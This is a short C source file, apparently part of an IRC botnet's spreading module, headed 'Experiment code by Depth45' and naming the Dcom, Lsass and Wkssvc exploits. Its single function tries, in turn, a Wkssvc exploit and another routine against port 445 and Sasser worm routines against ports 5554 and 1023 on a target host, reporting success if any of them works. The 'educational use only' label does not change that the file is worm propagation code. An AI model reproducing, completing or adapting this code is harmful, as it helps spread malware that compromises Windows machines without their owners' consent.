/*************************************************************
 *    Experiment code by Depth45. For educational use only   *
 *           Dcom, Lsass, WkssvcOth and WkssvcEng            *
 *   Has a small bug , does not say FT sending sometimes     *
 *                         PRIVATE                           *
 *************************************************************/



#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_DEPTH
#ifndef NO_DEPTH2
#ifndef NO_DEPTH3

bool r00t3(EXINFO exinfo)
 {
	exinfo.port = 445;
	bool bR00T = wkssvc(exinfo);
	exinfo.port = 445;
	bool bR00T1 = r00t1(exinfo);
	exinfo.port = 5554;
	bool bSasser = sasser(exinfo);
	exinfo.port = 1023;
	bool bSasserE = sasser(exinfo);
	return (bR00T || bR00T1 || bSasser || bSasserE)?(true):(false);
}

#endif
#endif
#endif